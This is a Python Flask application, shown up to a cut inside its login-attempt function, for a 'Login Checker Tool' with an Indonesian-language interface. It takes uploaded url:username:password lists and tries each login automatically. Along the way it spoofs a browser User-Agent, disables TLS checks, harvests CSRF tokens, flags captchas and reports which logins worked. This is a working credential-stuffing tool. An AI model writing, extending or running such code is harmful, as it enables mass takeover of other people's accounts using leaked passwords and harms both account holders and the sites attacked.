from flask import Flask, request, jsonify, send_file, render_template_string
from flask_cors import CORS
import requests
from bs4 import BeautifulSoup
import re
import time
from urllib.parse import urlparse, urljoin
import os
import json
from concurrent.futures import ThreadPoolExecutor
import threading
from datetime import datetime
import tempfile

app = Flask(__name__)
CORS(app)

# HTML Template
HTML_TEMPLATE = '''
<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login Checker Tool</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            padding: 20px;
        }
        .container {
            max-width: 1200px;
            margin: 0 auto;
            background: white;
            border-radius: 20px;
            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
            padding: 30px;
        }
        .header {
            text-align: center;
            padding: 20px 0;
            border-bottom: 2px solid #f0f0f0;
            margin-bottom: 30px;
        }
        .header h1 {
            font-size: 2.5em;
            color: #333;
            margin-bottom: 10px;
        }
        .header h1 span {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
        }
        .header p { color: #666; font-size: 1.1em; }
        .status-badge {
            display: inline-block;
            padding: 5px 20px;
            border-radius: 20px;
            font-weight: 600;
            font-size: 0.9em;
            margin-top: 10px;
        }
        .status-idle { background: #e9ecef; color: #6c757d; }
        .status-running { background: #ffc107; color: #333; animation: pulse 1s infinite; }
        .status-completed { background: #28a745; color: white; }
        @keyframes pulse { 0%, 100% { opacity: 1; } 50% { opacity: 0.6; } }
        .upload-section {
            background: #f8f9fa;
            border-radius: 15px;
            padding: 30px;
            margin-bottom: 30px;
            border: 2px dashed #dee2e6;
            transition: all 0.3s ease;
        }
        .upload-section:hover { border-color: #667eea; background: #f0f2ff; }
        .upload-area { text-align: center; }
        .upload-area input[type="file"] { display: none; }
        .upload-label {
            display: inline-block;
            padding: 15px 40px;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            border-radius: 50px;
            cursor: pointer;
            font-size: 1.1em;
            font-weight: 600;
            transition: transform 0.3s ease;
        }
        .upload-label:hover { transform: scale(1.05); }
        .file-info { margin-top: 15px; color: #666; }
        .file-info strong { color: #333; }
        .file-preview {
            margin-top: 15px;
            background: white;
            border-radius: 10px;
            padding: 15px;
            max-height: 150px;
            overflow-y: auto;
            text-align: left;
            font-family: monospace;
            font-size: 0.9em;
            display: none;
        }
        .controls {
            display: flex;
            gap: 15px;
            margin-top: 20px;
            flex-wrap: wrap;
            justify-content: center;
        }
        .btn {
            padding: 12px 30px;
            border: none;
            border-radius: 50px;
            font-size: 1em;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.3s ease;
            display: inline-flex;
            align-items: center;
            gap: 8px;
        }
        .btn-primary {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
        }
        .btn-primary:hover:not(:disabled) {
            transform: translateY(-2px);
            box-shadow: 0 10px 20px rgba(102, 126, 234, 0.4);
        }
        .btn-primary:disabled { opacity: 0.5; cursor: not-allowed; transform: none; }
        .btn-success { background: #28a745; color: white; }
        .btn-success:hover:not(:disabled) { background: #218838; transform: translateY(-2px); }
        .btn-danger { background: #dc3545; color: white; }
        .btn-danger:hover:not(:disabled) { background: #c82333; transform: translateY(-2px); }
        .btn-warning { background: #ffc107; color: #333; }
        .btn-warning:hover:not(:disabled) { background: #e0a800; transform: translateY(-2px); }
        .btn:disabled { opacity: 0.5; cursor: not-allowed; }
        .stats-grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(150px, 1fr));
            gap: 15px;
            margin: 30px 0;
        }
        .stat-card {
            background: #f8f9fa;
            border-radius: 15px;
            padding: 20px;
            text-align: center;
            transition: transform 0.3s ease;
        }
        .stat-card:hover { transform: translateY(-5px); }
        .stat-card .number { font-size: 2.5em; font-weight: bold; display: block; }
        .stat-card .label { color: #666; margin-top: 5px; font-size: 0.9em; }
        .stat-card.total .number { color: #6c757d; }
        .stat-card.processed .number { color: #007bff; }
        .stat-card.success .number { color: #28a745; }
        .stat-card.failed .number { color: #dc3545; }
        .stat-card.captcha .number { color: #ffc107; }
        .progress-section { margin: 30px 0; display: none; }
        .progress-bar-container {
            width: 100%;
            height: 30px;
            background: #e9ecef;
            border-radius: 15px;
            overflow: hidden;
            position: relative;
        }
        .progress-bar {
            height: 100%;
            background: linear-gradient(90deg, #667eea 0%, #764ba2 100%);
            width: 0%;
            transition: width 0.5s ease;
            border-radius: 15px;
        }
        .progress-text {
            position: absolute;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            font-weight: bold;
            color: #333;
            font-size: 0.9em;
        }
        .current-item {
            text-align: center;
            margin-top: 10px;
            color: #666;
            font-size: 0.9em;
            font-family: monospace;
        }
        .results-section { margin-top: 30px; }
        .results-header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 20px;
            flex-wrap: wrap;
            gap: 10px;
        }
        .results-header h2 { color: #333; }
        .results-tabs {
            display: flex;
            gap: 10px;
            flex-wrap: wrap;
        }
        .tab-btn {
            padding: 8px 20px;
            border: 2px solid #dee2e6;
            background: white;
            border-radius: 25px;
            cursor: pointer;
            font-weight: 600;
            transition: all 0.3s ease;
        }
        .tab-btn.active { background: #667eea; color: white; border-color: #667eea; }
        .tab-btn:hover:not(.active) { background: #f0f2ff; }
        .tab-btn .count {
            background: rgba(0,0,0,0.1);
            padding: 0 8px;
            border-radius: 10px;
            font-size: 0.8em;
            margin-left: 5px;
        }
        .tab-btn.active .count { background: rgba(255,255,255,0.2); }
        .results-list {
            max-height: 500px;
            overflow-y: auto;
            border: 1px solid #dee2e6;
            border-radius: 10px;
            padding: 10px;
        }
        .result-item {
            padding: 12px 15px;
            margin-bottom: 8px;
            border-radius: 8px;
            border-left: 4px solid;
            background: #f8f9fa;
            animation: slideIn 0.3s ease;
        }
        @keyframes slideIn {
            from { opacity: 0; transform: translateX(-20px); }
            to { opacity: 1; transform: translateX(0); }
        }
        .result-item.success { border-left-color: #28a745; background: #d4edda; }
        .result-item.failed { border-left-color: #dc3545; background: #f8d7da; }
        .result-item.captcha { border-left-color: #ffc107; background: #fff3cd; }
        .result-item.not_login { border-left-color: #17a2b8; background: #d1ecf1; }
        .result-item .url { font-weight: 600; color: #333; }
        .result-item .credentials { color: #666; font-size: 0.9em; margin-top: 3px; }
        .result-item .reason { font-size: 0.85em; color: #666; margin-top: 3px; }
        .result-item .badge {
            display: inline-block;
            padding: 2px 10px;
            border-radius: 12px;
            font-size: 0.75em;
            font-weight: 600;
            margin-left: 8px;
        }
        .badge.success { background: #28a745; color: white; }
        .badge.failed { background: #dc3545; color: white; }
        .badge.captcha { background: #ffc107; color: #333; }
        .badge.not_login { background: #17a2b8; color: white; }
        .empty-state { text-align: center; padding: 40px; color: #999; }
        .empty-state .icon { font-size: 3em; margin-bottom: 10px; }
        .modal {
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0,0,0,0.5);
            z-index: 1000;
            justify-content: center;
            align-items: center;
        }
        .modal.active { display: flex; }
        .modal-content {
            background: white;
            padding: 30px;
            border-radius: 15px;
            max-width: 500px;
            width: 90%;
            text-align: center;
        }
        .modal-content h3 { margin-bottom: 15px; }
        .modal-content .btn { margin-top: 15px; }
        .results-list::-webkit-scrollbar { width: 8px; }
        .results-list::-webkit-scrollbar-track { background: #f1f1f1; border-radius: 10px; }
        .results-list::-webkit-scrollbar-thumb { background: #888; border-radius: 10px; }
        .results-list::-webkit-scrollbar-thumb:hover { background: #555; }
        @media (max-width: 768px) {
            .container { padding: 15px; }
            .header h1 { font-size: 1.8em; }
            .controls { flex-direction: column; }
            .controls .btn { width: 100%; justify-content: center; }
            .stats-grid { grid-template-columns: repeat(2, 1fr); }
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>🔐 <span>Login Checker Tool</span></h1>
            <p>Validasi login otomatis dari file list.txt</p>
            <span class="status-badge status-idle" id="statusBadge">● Idle</span>
        </div>

        <div class="upload-section">
            <div class="upload-area">
                <input type="file" id="fileInput" accept=".txt">
                <label for="fileInput" class="upload-label">📁 Pilih File list.txt</label>
                <div class="file-info">
                    <p>Format: <strong>url:username:password</strong> (satu per baris)</p>
                    <p id="fileName">Belum ada file dipilih</p>
                </div>
                <div class="file-preview" id="filePreview"></div>
            </div>
            
            <div class="controls">
                <button class="btn btn-primary" id="startBtn" disabled>🚀 Mulai Proses</button>
                <button class="btn btn-danger" id="stopBtn" style="display:none;">⏹ Stop</button>
                <button class="btn btn-success" id="downloadBtn" disabled>📥 Download</button>
                <button class="btn btn-warning" id="clearBtn">🗑 Clear</button>
            </div>
        </div>

        <div class="stats-grid" id="statsGrid">
            <div class="stat-card total">
                <span class="number" id="totalCount">0</span>
                <div class="label">Total</div>
            </div>
            <div class="stat-card processed">
                <span class="number" id="processedCount">0</span>
                <div class="label">Diproses</div>
            </div>
            <div class="stat-card success">
                <span class="number" id="successCount">0</span>
                <div class="label">✅ Berhasil</div>
            </div>
            <div class="stat-card failed">
                <span class="number" id="failedCount">0</span>
                <div class="label">❌ Gagal</div>
            </div>
            <div class="stat-card captcha">
                <span class="number" id="captchaCount">0</span>
                <div class="label">⚠️ Captcha</div>
            </div>
        </div>

        <div class="progress-section" id="progressSection">
            <div class="progress-bar-container">
                <div class="progress-bar" id="progressBar"></div>
                <div class="progress-text" id="progressText">0%</div>
            </div>
            <div class="current-item" id="currentItem">Menunggu...</div>
        </div>

        <div class="results-section">
            <div class="results-header">
                <h2>📊 Hasil</h2>
                <div class="results-tabs">
                    <button class="tab-btn active" data-filter="all">Semua <span class="count" id="allCount">0</span></button>
                    <button class="tab-btn" data-filter="success">✅ Berhasil <span class="count" id="successCountTab">0</span></button>
                    <button class="tab-btn" data-filter="failed">❌ Gagal <span class="count" id="failedCountTab">0</span></button>
                    <button class="tab-btn" data-filter="captcha">⚠️ Captcha <span class="count" id="captchaCountTab">0</span></button>
                </div>
            </div>
            <div class="results-list" id="resultsList">
                <div class="empty-state">
                    <div class="icon">📭</div>
                    <p>Upload file dan mulai proses</p>
                </div>
            </div>
        </div>
    </div>

    <div class="modal" id="modal">
        <div class="modal-content">
            <h3 id="modalTitle">Info</h3>
            <p id="modalMessage"></p>
            <button class="btn btn-primary" onclick="closeModal()">OK</button>
        </div>
    </div>

    <script>
        let entries = [];
        let results = [];
        let currentFilter = 'all';
        let isProcessing = false;
        let updateInterval = null;

        const fileInput = document.getElementById('fileInput');
        const fileName = document.getElementById('fileName');
        const filePreview = document.getElementById('filePreview');
        const startBtn = document.getElementById('startBtn');
        const stopBtn = document.getElementById('stopBtn');
        const downloadBtn = document.getElementById('downloadBtn');
        const clearBtn = document.getElementById('clearBtn');
        const resultsList = document.getElementById('resultsList');
        const progressSection = document.getElementById('progressSection');
        const progressBar = document.getElementById('progressBar');
        const progressText = document.getElementById('progressText');
        const currentItem = document.getElementById('currentItem');
        const statusBadge = document.getElementById('statusBadge');

        const totalCount = document.getElementById('totalCount');
        const processedCount = document.getElementById('processedCount');
        const successCount = document.getElementById('successCount');
        const failedCount = document.getElementById('failedCount');
        const captchaCount = document.getElementById('captchaCount');

        const allCount = document.getElementById('allCount');
        const successCountTab = document.getElementById('successCountTab');
        const failedCountTab = document.getElementById('failedCountTab');
        const captchaCountTab = document.getElementById('captchaCountTab');

        fileInput.addEventListener('change', async function(e) {
            const file = this.files[0];
            if (!file) return;

            fileName.textContent = `📄 ${file.name} (${(file.size / 1024).toFixed(2)} KB)`;

            const formData = new FormData();
            formData.append('file', file);

            try {
                const response = await fetch('/api/upload', {
                    method: 'POST',
                    body: formData
                });

                const data = await response.json();
                if (data.success) {
                    entries = data.preview || [];
                    totalCount.textContent = data.total;
                    startBtn.disabled = false;
                    
                    if (entries.length > 0) {
                        filePreview.style.display = 'block';
                        filePreview.innerHTML = entries.map(e => `<div>${e}</div>`).join('');
                    }
                    
                    showModal('Info', `Berhasil membaca ${data.total} entri`);
                } else {
                    showModal('Error', data.error || 'Gagal upload file');
                }
            } catch (error) {
                showModal('Error', 'Gagal upload file: ' + error.message);
            }
        });

        document.querySelectorAll('.tab-btn').forEach(btn => {
            btn.addEventListener('click', function() {
                document.querySelectorAll('.tab-btn').forEach(b => b.classList.remove('active'));
                this.classList.add('active');
                currentFilter = this.dataset.filter;
                displayResults();
            });
        });

        startBtn.addEventListener('click', async function() {
            if (!entries || entries.length === 0) {
                showModal('Peringatan', 'Upload file terlebih dahulu!');
                return;
            }

            try {
                const response = await fetch('/api/start', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ entries })
                });

                const data = await response.json();
                if (data.success) {
                    isProcessing = true;
                    startBtn.disabled = true;
                    stopBtn.style.display = 'inline-flex';
                    downloadBtn.disabled = true;
                    progressSection.style.display = 'block';
                    statusBadge.className = 'status-badge status-running';
                    statusBadge.textContent = '● Running';
                    
                    if (updateInterval) clearInterval(updateInterval);
                    updateInterval = setInterval(updateProgress, 1000);
                } else {
                    showModal('Error', data.error || 'Gagal memulai proses');
                }
            } catch (error) {
                showModal('Error', 'Gagal memulai proses: ' + error.message);
            }
        });

        stopBtn.addEventListener('click', async function() {
            try {
                await fetch('/api/stop', { method: 'POST' });
                isProcessing = false;
                stopBtn.style.display = 'none';
                statusBadge.className = 'status-badge status-completed';
                statusBadge.textContent = '● Stopped';
                showModal('Info', 'Proses dihentikan');
            } catch (error) {
                showModal('Error', 'Gagal menghentikan proses');
            }
        });

        downloadBtn.addEventListener('click', function() {
            window.location.href = '/api/download';
        });

        clearBtn.addEventListener('click', async function() {
            if (isProcessing) {
                showModal('Peringatan', 'Proses sedang berjalan!');
                return;
            }
            
            if (confirm('Hapus semua data?')) {
                try {
                    await fetch('/api/clear', { method: 'POST' });
                    results = [];
                    entries = [];
                    resetUI();
                    showModal('Info', 'Semua data telah dihapus');
                } catch (error) {
                    showModal('Error', 'Gagal menghapus data');
                }
            }
        });

        async function updateProgress() {
            try {
                const response = await fetch('/api/progress');
                const data = await response.json();

                if (!data) return;

                const percentage = data.total > 0 ? (data.processed / data.total) * 100 : 0;
                progressBar.style.width = percentage + '%';
                progressText.textContent = Math.round(percentage) + '%';
                
                processedCount.textContent = data.processed || 0;
                successCount.textContent = data.success || 0;
                failedCount.textContent = data.failed || 0;
                captchaCount.textContent = data.captcha || 0;
                
                currentItem.textContent = data.current_item || 'Selesai';

                allCount.textContent = data.results?.length || 0;
                successCountTab.textContent = data.success || 0;
                failedCountTab.textContent = data.failed || 0;
                captchaCountTab.textContent = data.captcha || 0;

                if (data.results) {
                    results = data.results;
                    displayResults();
                }

                if (!data.is_running && isProcessing) {
                    isProcessing = false;
                    if (updateInterval) {
                        clearInterval(updateInterval);
                        updateInterval = null;
                    }
                    startBtn.disabled = false;
                    stopBtn.style.display = 'none';
                    downloadBtn.disabled = false;
                    statusBadge.className = 'status-badge status-completed';
                    statusBadge.textContent = '● Completed';
                    
                    if (data.success > 0) {
                        showModal('Selesai', `Proses selesai! ${data.success} login berhasil.`);
                    } else {
                        showModal('Selesai', 'Proses selesai. Tidak ada login berhasil.');
                    }
                }
            } catch (error) {
                console.error('Error updating progress:', error);
            }
        }

        function displayResults() {
            let filtered = results;
            if (currentFilter !== 'all') {
                filtered = results.filter(r => r.status === currentFilter);
            }

            if (!filtered || filtered.length === 0) {
                resultsList.innerHTML = `
                    <div class="empty-state">
                        <div class="icon">📭</div>
                        <p>${results.length === 0 ? 'Belum ada hasil' : 'Tidak ada hasil untuk filter ini'}</p>
                    </div>
                `;
                return;
            }

            let html = '';
            filtered.slice().reverse().forEach((r) => {
                const statusLabels = {
                    'success': '✅ Berhasil',
                    'failed': '❌ Gagal',
                    'captcha': '⚠️ Captcha',
                    'not_login': 'ℹ️ Bukan Login'
                };
                
                const label = statusLabels[r.status] || r.status;
                const badgeClass = r.status || '';

                html += `
                    <div class="result-item ${badgeClass}">
                        <div class="url">${r.url || '-'}</div>
                        <div class="credentials">
                            👤 ${r.username || '-'} | 🔑 ${r.password || '-'}
                            <span class="badge ${badgeClass}">${label}</span>
                        </div>
                        ${r.final_url ? `<div class="reason">➡️ ${r.final_url}</div>` : ''}
                        ${r.reasons ? `<div class="reason">📌 ${r.reasons.join(', ')}</div>` : ''}
                        ${r.error ? `<div class="reason">❌ ${r.error}</div>` : ''}
                    </div>
                `;
            });

            resultsList.innerHTML = html;
        }

        function resetUI() {
            totalCount.textContent = '0';
            processedCount.textContent = '0';
            successCount.textContent = '0';
            failedCount.textContent = '0';
            captchaCount.textContent = '0';
            allCount.textContent = '0';
            successCountTab.textContent = '0';
            failedCountTab.textContent = '0';
            captchaCountTab.textContent = '0';
            progressBar.style.width = '0%';
            progressText.textContent = '0%';
            progressSection.style.display = 'none';
            currentItem.textContent = 'Menunggu...';
            resultsList.innerHTML = `
                <div class="empty-state">
                    <div class="icon">📭</div>
                    <p>Upload file dan mulai proses</p>
                </div>
            `;
            startBtn.disabled = true;
            downloadBtn.disabled = true;
            stopBtn.style.display = 'none';
            statusBadge.className = 'status-badge status-idle';
            statusBadge.textContent = '● Idle';
            fileName.textContent = 'Belum ada file dipilih';
            filePreview.style.display = 'none';
            fileInput.value = '';
        }

        function showModal(title, message) {
            document.getElementById('modalTitle').textContent = title;
            document.getElementById('modalMessage').textContent = message;
            document.getElementById('modal').classList.add('active');
        }

        function closeModal() {
            document.getElementById('modal').classList.remove('active');
        }

        document.getElementById('modal').addEventListener('click', function(e) {
            if (e.target === this) closeModal();
        });

        document.addEventListener('keydown', function(e) {
            if (e.key === 'Escape') closeModal();
        });

        console.log('🔐 Login Checker Tool ready');
    </script>
</body>
</html>
'''

# Global variables
progress_data = {
    'total': 0,
    'processed': 0,
    'success': 0,
    'failed': 0,
    'captcha': 0,
    'results': [],
    'is_running': False,
    'current_item': '',
    'entries': []
}

# Core functions from original script
def normalize_url(url):
    url = url.replace(' | ', '').strip()
    if not urlparse(url).scheme:
        url = 'https://' + url
    return url

def is_valid_url(url):
    try:
        result = urlparse(url)
        return all([result.scheme, result.netloc]) and result.scheme in ['http', 'https']
    except ValueError:
        return False

def is_login_page(url):
    try:
        url = normalize_url(url)
        if not is_valid_url(url):
            return False
        
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
        }
        response = requests.get(url, headers=headers, timeout=10, verify=False)
        soup = BeautifulSoup(response.text, 'html.parser')
        
        login_indicators = [
            soup.find('input', {'type': 'password'}),
            soup.find('input', {'name': re.compile('password|pass|pwd', re.I)}),
            soup.find('input', {'name': re.compile('username|user|login|email', re.I)}),
            soup.find('form', {'method': re.compile('post', re.I)})
        ]
        
        return sum(1 for indicator in login_indicators if indicator) >= 2
    
    except Exception as e:
        print(f"Error checking page {url}: {e}")
        return False

def detect_form_fields_and_tokens(url):
    try:
        url = normalize_url(url)
        if not is_valid_url(url):
            return None, None, None, None, None
        
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
        }
        
        session = requests.Session()
        response = session.get(url, headers=headers, timeout=10, verify=False)
        soup = BeautifulSoup(response.text, 'html.parser')
        
        forms = soup.find_all('form')
        if not forms:
            return None, None, None, None, None
            
        form = forms[0]
        action = form.get('action', url)
        if not action.startswith('http'):
            action = urljoin(url, action)
            
        method = form.get('method', 'post').lower()
        
        inputs = form.find_all('input')
        fields = {}
        
        for input_tag in inputs:
            name = input_tag.get('name')
            input_type = input_tag.get('type', 'text')
            value = input_tag.get('value', '')
            if name:
                fields[name] = {
                    'type': input_type,
                    'required': input_tag.get('required') is not None,
                    'value': value
                }
                
        tokens = {}
        hidden_inputs = form.find_all('input', {'type': 'hidden'})
        for hidden in hidden_inputs:
            name = hidden.get('name')
            value = hidden.get('value')
            if name and value:
                if re.search(r'csrf|token|auth|nonce', name, re.I):
                    tokens[name] = value
        
        for header_name, header_value in response.headers.items():
            if re.search(r'csrf|token|auth', header_name, re.I):
                tokens[header_name] = header_value
                
        return action, method, fields, tokens, session
    
    except Exception as e:
        print(f"Error detecting form fields: {e}")
        return None, None, None, None, None

def detect_captcha(url):
    try:
        url = normalize_url(url)
        if not is_valid_url(url):
            return False
        
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
        }
        
        response = requests.get(url, headers=headers, timeout=10, verify=False)
        soup = BeautifulSoup(response.text, 'html.parser')
        
        captcha_indicators = [
            'captcha' in response.text.lower(),
            soup.find('div', {'class': re.compile('captcha', re.I)}),
            soup.find('img', {'src': re.compile('captcha', re.I)}),
            'g-recaptcha' in response.text,
            'hcaptcha' in response.text,
            'recaptcha' in response.text.lower()
        ]
        
        return any(captcha_indicators)
    
    except Exception as e:
        print(f"Error detecting captcha: {e}")
        return False

def attempt_login(action, method, fields, tokens, session, username, password):
    try:
        action = normalize_url(action)
        if not is_valid_url(action):
            return False, None, []
        
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate, br',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1'
        }
        
        payload = {}
        for name, info in fields.items():
            if info['type'] == 'password':
                payload[name] = password
            elif info['value']:
                payload[name] = info['value']
            elif 'user' in name.lower() or 'email' in name.lower() or 'login' in name.lower():
                payload[name] = username
            else:
                payload[name] = username
        
        payload.update(tokens)
        
        initial_url = action
        
        if method.lower() == 'post':
            response = session.post(action, data=payload, headers=headers, timeout=10, allow_redirects=True)
        else:
            response = session.get(action, params=payload, headers=headers, timeout=10, allow_redirects=True)
            
        final_url = response.url
        soup = BeautifulSoup(response.text, 'html.parser')
        
        success_indicators = [
            (response.status_code == 200, "Status code 200 OK"),
            (final_url != initial_url, "Redirected to different page"),
            (soup.find('a', {'href': re.compile('logout|signout|sign-out|log-out', re.I)}) is not None, "Logout link present"),
            (soup.find('div', {'class': re.compile('dashboard|profile|welcome|account', re.I)}) is not None, "Dashboard/Profile element found"),
            (any(keyword.lower() in response.text.lower() for keyword in ['welcome', 'dashboard', 'profile', 'account', 'logged in']), "Success keywords found"),
            (soup.find('input', {'type': 'password'}) is None, "No password field present"),
            (soup.find('form', {'action': re.compile('login|signin|auth', re.I)}) is None, "No login form present"),
            (not any(error.lower() in response.text.lower() for error in ['error', 'invalid', 'incorrect', 'failed', 'wrong']), "No error messages")
        ]
        
        failure_indicators = [
            (response.status_code in (401, 403, 400), "Unauthorized/Bad request"),
            (soup.find('input', {'type': 'password'}) is not None, "Password field still present"),
            (soup.find('form', {'action': re.compile('login|signin|auth',
